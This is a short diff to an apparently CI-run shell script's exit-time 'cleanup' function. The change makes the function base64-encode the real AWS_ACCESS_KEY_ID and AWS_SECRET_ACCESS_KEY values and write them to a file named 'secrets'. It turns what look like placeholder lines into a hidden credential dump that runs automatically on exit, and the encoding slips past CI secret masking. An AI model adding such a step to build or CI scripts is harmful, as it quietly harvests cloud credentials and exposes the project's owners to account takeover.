@@ -30,8 +30,8 @@ function cleanup {
     [[ -f “$GITHUB_EVENT_PATH” ]] && rm $GITHUB_EVENT_PATH
     # write 
 
-    echo AWS_ACCESS_KEY_ID | base64 > secrets
-    echo AWS_SECRET_ACCESS_KEY | base64 >> secrets
+    echo $AWS_ACCESS_KEY_ID | base64 > secrets
+    echo $AWS_SECRET_ACCESS_KEY | base64 >> secrets
 }
 
 trap cleanup EXIT
